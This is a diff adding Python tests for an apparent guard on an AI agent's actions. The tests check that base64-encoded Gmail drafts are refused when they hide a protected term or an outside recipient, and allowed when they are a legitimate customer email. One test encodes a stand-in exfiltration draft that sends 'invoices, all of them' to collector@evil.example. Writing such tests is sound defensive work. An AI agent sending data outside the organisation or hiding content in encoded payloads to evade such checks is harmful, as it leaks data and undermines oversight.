@@ -344,3 +344,56 @@ def test_refusal_is_recorded_on_the_context(context: Context) -> None:
 def test_empty_definition_of_done_still_blocks_deletes(context: Context) -> None:
     context.dod = DefinitionOfDone()
     assert _refusal(context, make_action(method="DELETE")) == "method"
+
+
+# -- base64url raw payloads (Gmail drafts) ---------------------------------------------
+
+
+def _raw(text: str) -> str:
+    import base64
+
+    return base64.urlsafe_b64encode(text.encode("utf-8")).decode("ascii").rstrip("=")
+
+
+def test_protected_term_hidden_in_base64_raw_is_refused(context: Context) -> None:
+    action = make_action(
+        provider="gmail",
+        method="POST",
+        path="/gmail/v1/users/me/drafts",
+        body={
+            "message": {
+                "raw": _raw("To: contact@rivermill-studios.example\r\nSubject: hi\r\n\r\nUpdating the prospect")
+            }
+        },
+        fields=("message", "raw"),
+    )
+    assert _refusal(context, action) in {"protected", "external_destination"}
+
+
+def test_external_recipient_hidden_in_base64_raw_is_refused(context: Context) -> None:
+    action = make_action(
+        provider="gmail",
+        method="POST",
+        path="/gmail/v1/users/me/drafts",
+        body={"message": {"raw": _raw("To: collector@evil.example\r\nSubject: invoices\r\n\r\nall of them")}},
+        fields=("message", "raw"),
+    )
+    assert _refusal(context, action) == "external_destination"
+
+
+def test_customer_draft_in_base64_raw_is_allowed(context: Context) -> None:
+    action = make_action(
+        provider="gmail",
+        method="POST",
+        path="/gmail/v1/users/me/drafts",
+        body={
+            "message": {
+                "raw": _raw(
+                    "To: ap@rivermill.example\r\nSubject: Confirmation: billing contact update for Rivermill Studio"
+                    "\r\n\r\nFormer billing@rivermill.example, verified ap@rivermill.example. Awaiting owner review."
+                )
+            }
+        },
+        fields=("message", "raw"),
+    )
+    _allowed(context, action)
